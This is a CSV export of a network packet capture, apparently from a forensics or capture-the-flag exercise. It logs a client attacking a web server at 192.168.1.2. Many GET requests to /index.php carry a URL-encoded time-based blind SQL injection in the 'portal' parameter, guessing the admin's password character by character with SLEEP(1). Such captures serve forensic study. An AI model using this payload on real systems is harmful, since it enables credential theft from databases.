"No","Time","Source","Destination","Protocol","Length","Info"
"11","5.629414738","192.168.1.2","150.95.139.51","TCP","66","80  >  33396 [ACK] Seq=1 Ack=226 Win=30080 Len=0 TSval=2792897630 TSecr=3262423185"
"12","5.629457982","150.95.139.51","192.168.1.2","HTTP","92","POST /login.php HTTP/1.1  (application/x-www-form-urlencoded)"
"13","5.629467268","192.168.1.2","150.95.139.51","TCP","66","80  >  33396 [ACK] Seq=1 Ack=252 Win=30080 Len=0 TSval=2792897630 TSecr=3262423185"
"14","5.631738584","192.168.1.2","150.95.139.51","HTTP","540","HTTP/1.1 302 Found  (text/html)"
"15","5.640817083","150.95.139.51","192.168.1.2","TCP","66","33396  >  80 [ACK] Seq=252 Ack=475 Win=30336 Len=0 TSval=3262423197 TSecr=2792897632"
"16","5.643285342","150.95.139.51","192.168.1.2","TCP","66","33396  >  80 [FIN, ACK] Seq=252 Ack=475 Win=30336 Len=0 TSval=3262423199 TSecr=2792897632"
"17","5.643439079","192.168.1.2","150.95.139.51","TCP","66","80  >  33396 [FIN, ACK] Seq=475 Ack=253 Win=30080 Len=0 TSval=2792897644 TSecr=3262423199"
"18","5.645274942","150.95.139.51","192.168.1.2","TCP","74","33398  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423202 TSecr=0 WS=128"
"19","5.645323839","192.168.1.2","150.95.139.51","TCP","74","80  >  33398 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897646 TSecr=3262423202 WS=128"
"20","5.647847207","150.95.139.51","192.168.1.2","TCP","66","33396  >  80 [ACK] Seq=253 Ack=476 Win=30336 Len=0 TSval=3262423204 TSecr=2792897644"
"21","5.649978199","150.95.139.51","192.168.1.2","TCP","66","33398  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423207 TSecr=2792897646"
"22","5.650384252","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D48%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"23","5.650436257","192.168.1.2","150.95.139.51","TCP","66","80  >  33398 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897651 TSecr=3262423207"
"24","5.652948109","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"25","5.662763744","150.95.139.51","192.168.1.2","TCP","66","33398  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423219 TSecr=2792897653"
"26","5.663880270","150.95.139.51","192.168.1.2","TCP","66","33398  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423220 TSecr=2792897653"
"27","5.663957872","192.168.1.2","150.95.139.51","TCP","66","80  >  33398 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897664 TSecr=3262423220"
"28","5.667303261","150.95.139.51","192.168.1.2","TCP","74","33400  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423224 TSecr=0 WS=128"
"29","5.667323628","192.168.1.2","150.95.139.51","TCP","74","80  >  33400 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897668 TSecr=3262423224 WS=128"
"30","5.684213149","150.95.139.51","192.168.1.2","TCP","66","33400  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423229 TSecr=2792897668"
"31","5.684227561","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D49%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"32","5.684249005","192.168.1.2","150.95.139.51","TCP","66","80  >  33400 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897685 TSecr=3262423229"
"33","5.685528929","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"34","5.692424581","150.95.139.51","192.168.1.2","TCP","66","33400  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423249 TSecr=2792897686"
"35","5.693027143","150.95.139.51","192.168.1.2","TCP","66","33400  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423250 TSecr=2792897686"
"36","5.693129443","192.168.1.2","150.95.139.51","TCP","66","80  >  33400 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897693 TSecr=3262423250"
"37","5.695516105","150.95.139.51","192.168.1.2","TCP","74","33402  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423252 TSecr=0 WS=128"
"38","5.695546485","192.168.1.2","150.95.139.51","TCP","74","80  >  33402 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897696 TSecr=3262423252 WS=128"
"39","5.697171806","150.95.139.51","192.168.1.2","TCP","66","33400  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423254 TSecr=2792897693"
"40","5.700191854","150.95.139.51","192.168.1.2","TCP","66","33402  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423256 TSecr=2792897696"
"41","5.700248122","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D50%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"42","5.700282244","192.168.1.2","150.95.139.51","TCP","66","80  >  33402 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897701 TSecr=3262423256"
"43","5.702204102","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"44","5.708783147","150.95.139.51","192.168.1.2","TCP","66","33402  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423265 TSecr=2792897703"
"45","5.709694934","150.95.139.51","192.168.1.2","TCP","66","33402  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423266 TSecr=2792897703"
"46","5.709848832","192.168.1.2","150.95.139.51","TCP","66","80  >  33402 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897710 TSecr=3262423266"
"47","5.712160387","150.95.139.51","192.168.1.2","TCP","74","33404  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423268 TSecr=0 WS=128"
"48","5.712210053","192.168.1.2","150.95.139.51","TCP","74","80  >  33404 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897713 TSecr=3262423268 WS=128"
"49","5.713620044","150.95.139.51","192.168.1.2","TCP","66","33402  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423270 TSecr=2792897710"
"50","5.716349803","150.95.139.51","192.168.1.2","TCP","66","33404  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423273 TSecr=2792897713"
"51","5.716443899","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D51%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"52","5.716493871","192.168.1.2","150.95.139.51","TCP","66","80  >  33404 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897717 TSecr=3262423273"
"53","5.718990220","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"54","5.727655754","150.95.139.51","192.168.1.2","TCP","66","33404  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423284 TSecr=2792897719"
"55","5.728199257","150.95.139.51","192.168.1.2","TCP","66","33404  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423285 TSecr=2792897719"
"56","5.728356911","192.168.1.2","150.95.139.51","TCP","66","80  >  33404 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897729 TSecr=3262423285"
"57","5.730391404","150.95.139.51","192.168.1.2","TCP","74","33406  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423287 TSecr=0 WS=128"
"58","5.730439467","192.168.1.2","150.95.139.51","TCP","74","80  >  33406 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897731 TSecr=3262423287 WS=128"
"59","5.732102013","150.95.139.51","192.168.1.2","TCP","66","33404  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423289 TSecr=2792897729"
"60","5.734548454","150.95.139.51","192.168.1.2","TCP","66","33406  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423291 TSecr=2792897731"
"61","5.734733721","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D52%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"62","5.734789126","192.168.1.2","150.95.139.51","TCP","66","80  >  33406 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897735 TSecr=3262423291"
"63","5.737539153","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"64","5.742452561","150.95.139.51","192.168.1.2","TCP","66","33406  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423299 TSecr=2792897738"
"65","5.743374598","150.95.139.51","192.168.1.2","TCP","66","33406  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423300 TSecr=2792897738"
"66","5.743530607","192.168.1.2","150.95.139.51","TCP","66","80  >  33406 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897744 TSecr=3262423300"
"67","5.746253698","150.95.139.51","192.168.1.2","TCP","74","33408  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423303 TSecr=0 WS=128"
"68","5.746302510","192.168.1.2","150.95.139.51","TCP","74","80  >  33408 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897747 TSecr=3262423303 WS=128"
"69","5.747387722","150.95.139.51","192.168.1.2","TCP","66","33406  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423304 TSecr=2792897744"
"70","5.750298599","150.95.139.51","192.168.1.2","TCP","66","33408  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423307 TSecr=2792897747"
"71","5.750605064","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D53%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"72","5.750671170","192.168.1.2","150.95.139.51","TCP","66","80  >  33408 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897751 TSecr=3262423307"
"73","5.753424298","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"74","5.757587299","150.95.139.51","192.168.1.2","TCP","66","33408  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423314 TSecr=2792897754"
"75","5.758525827","150.95.139.51","192.168.1.2","TCP","66","33408  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423315 TSecr=2792897754"
"76","5.758679378","192.168.1.2","150.95.139.51","TCP","66","80  >  33408 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897759 TSecr=3262423315"
"77","5.761172462","150.95.139.51","192.168.1.2","TCP","74","33410  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423318 TSecr=0 WS=128"
"78","5.761221964","192.168.1.2","150.95.139.51","TCP","74","80  >  33410 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897762 TSecr=3262423318 WS=128"
"79","5.762375422","150.95.139.51","192.168.1.2","TCP","66","33408  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423319 TSecr=2792897759"
"80","5.765078161","150.95.139.51","192.168.1.2","TCP","66","33410  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423322 TSecr=2792897762"
"81","5.765550815","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D54%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"82","5.765616995","192.168.1.2","150.95.139.51","TCP","66","80  >  33410 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897766 TSecr=3262423322"
"83","5.768405427","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"84","5.774186821","150.95.139.51","192.168.1.2","TCP","66","33410  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423329 TSecr=2792897769"
"85","5.774231928","150.95.139.51","192.168.1.2","TCP","66","33410  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423330 TSecr=2792897769"
"86","5.774370886","192.168.1.2","150.95.139.51","TCP","66","80  >  33410 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897775 TSecr=3262423330"
"87","5.776558963","150.95.139.51","192.168.1.2","TCP","74","33412  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423333 TSecr=0 WS=128"
"88","5.776608257","192.168.1.2","150.95.139.51","TCP","74","80  >  33412 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897777 TSecr=3262423333 WS=128"
"89","5.778063054","150.95.139.51","192.168.1.2","TCP","66","33410  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423334 TSecr=2792897775"
"90","5.780522403","150.95.139.51","192.168.1.2","TCP","66","33412  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423337 TSecr=2792897777"
"91","5.780557540","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D55%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"92","5.780604076","192.168.1.2","150.95.139.51","TCP","66","80  >  33412 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897781 TSecr=3262423337"
"93","5.783345179","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"94","5.787813923","150.95.139.51","192.168.1.2","TCP","66","33412  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423344 TSecr=2792897784"
"95","5.788306069","150.95.139.51","192.168.1.2","TCP","66","33412  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423345 TSecr=2792897784"
"96","5.788479303","192.168.1.2","150.95.139.51","TCP","66","80  >  33412 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897789 TSecr=3262423345"
"97","5.791027242","150.95.139.51","192.168.1.2","TCP","74","33414  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423347 TSecr=0 WS=128"
"98","5.791076796","192.168.1.2","150.95.139.51","TCP","74","80  >  33414 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897791 TSecr=3262423347 WS=128"
"99","5.792206931","150.95.139.51","192.168.1.2","TCP","66","33412  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423349 TSecr=2792897789"
"100","5.795094988","150.95.139.51","192.168.1.2","TCP","66","33414  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423351 TSecr=2792897791"
"101","5.795236354","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D56%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"102","5.795293072","192.168.1.2","150.95.139.51","TCP","66","80  >  33414 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897796 TSecr=3262423351"
"103","5.797990022","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"104","5.802176807","150.95.139.51","192.168.1.2","TCP","66","33414  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423359 TSecr=2792897798"
"105","5.803041484","150.95.139.51","192.168.1.2","TCP","66","33414  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423360 TSecr=2792897798"
"106","5.803204736","192.168.1.2","150.95.139.51","TCP","66","80  >  33414 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897804 TSecr=3262423360"
"107","5.805995680","150.95.139.51","192.168.1.2","TCP","74","33416  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423362 TSecr=0 WS=128"
"108","5.806044343","192.168.1.2","150.95.139.51","TCP","74","80  >  33416 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897806 TSecr=3262423362 WS=128"
"109","5.806752390","150.95.139.51","192.168.1.2","TCP","66","33414  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423363 TSecr=2792897804"
"110","5.810474361","150.95.139.51","192.168.1.2","TCP","66","33416  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423366 TSecr=2792897806"
"111","5.810640391","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D57%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"112","5.810695676","192.168.1.2","150.95.139.51","TCP","66","80  >  33416 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897811 TSecr=3262423366"
"113","5.813445993","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"114","5.822928081","150.95.139.51","192.168.1.2","TCP","66","33416  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423374 TSecr=2792897814"
"115","5.823009735","150.95.139.51","192.168.1.2","TCP","66","33416  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423375 TSecr=2792897814"
"116","5.823064518","150.95.139.51","192.168.1.2","TCP","74","33418  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423378 TSecr=0 WS=128"
"117","5.823107091","192.168.1.2","150.95.139.51","TCP","74","80  >  33418 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897823 TSecr=3262423378 WS=128"
"118","5.823144146","192.168.1.2","150.95.139.51","TCP","66","80  >  33416 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897824 TSecr=3262423375"
"119","5.827341413","150.95.139.51","192.168.1.2","TCP","66","33416  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423383 TSecr=2792897824"
"120","5.830985778","150.95.139.51","192.168.1.2","TCP","66","33418  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423383 TSecr=2792897823"
"121","5.831016782","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D97%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"122","5.831062070","192.168.1.2","150.95.139.51","TCP","66","80  >  33418 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897831 TSecr=3262423383"
"123","5.833655290","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"124","5.837964224","150.95.139.51","192.168.1.2","TCP","66","33418  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423394 TSecr=2792897834"
"125","5.838509883","150.95.139.51","192.168.1.2","TCP","66","33418  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423395 TSecr=2792897834"
"126","5.838664362","192.168.1.2","150.95.139.51","TCP","66","80  >  33418 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897839 TSecr=3262423395"
"127","5.841078331","150.95.139.51","192.168.1.2","TCP","74","33420  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423398 TSecr=0 WS=128"
"128","5.841127599","192.168.1.2","150.95.139.51","TCP","74","80  >  33420 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897842 TSecr=3262423398 WS=128"
"129","5.842092108","150.95.139.51","192.168.1.2","TCP","66","33418  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423399 TSecr=2792897839"
"130","5.844797687","150.95.139.51","192.168.1.2","TCP","66","33420  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423401 TSecr=2792897842"
"131","5.845269275","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D98%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"132","5.845334725","192.168.1.2","150.95.139.51","TCP","66","80  >  33420 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897846 TSecr=3262423401"
"133","5.848035653","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"134","5.851790178","150.95.139.51","192.168.1.2","TCP","66","33420  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423408 TSecr=2792897848"
"135","5.852913746","150.95.139.51","192.168.1.2","TCP","66","33420  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423409 TSecr=2792897848"
"136","5.853067793","192.168.1.2","150.95.139.51","TCP","66","80  >  33420 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897853 TSecr=3262423409"
"137","5.855438072","150.95.139.51","192.168.1.2","TCP","74","33422  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423412 TSecr=0 WS=128"
"138","5.855488436","192.168.1.2","150.95.139.51","TCP","74","80  >  33422 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792897856 TSecr=3262423412 WS=128"
"139","5.856546327","150.95.139.51","192.168.1.2","TCP","66","33420  >  80 [ACK] Seq=364 Ack=619 Win=30464 Len=0 TSval=3262423413 TSecr=2792897853"
"140","5.859304070","150.95.139.51","192.168.1.2","TCP","66","33422  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262423416 TSecr=2792897856"
"141","5.859457503","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D99%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"142","5.859513393","192.168.1.2","150.95.139.51","TCP","66","80  >  33422 [ACK] Seq=1 Ack=363 Win=30080 Len=0 TSval=2792897860 TSecr=3262423416"
"143","5.862249827","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"144","5.866196715","150.95.139.51","192.168.1.2","TCP","66","33422  >  80 [ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423423 TSecr=2792897863"
"145","5.867144168","150.95.139.51","192.168.1.2","TCP","66","33422  >  80 [FIN, ACK] Seq=363 Ack=618 Win=30464 Len=0 TSval=3262423424 TSecr=2792897863"
"146","5.867296441","192.168.1.2","150.95.139.51","TCP","66","80  >  33422 [FIN, ACK] Seq=618 Ack=364 Win=30080 Len=0 TSval=2792897868 TSecr=3262423424"
"147","5.869752156","150.95.139.51","192.168.1.2","TCP","74","33424  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262423426 TSecr=0 WS=128"
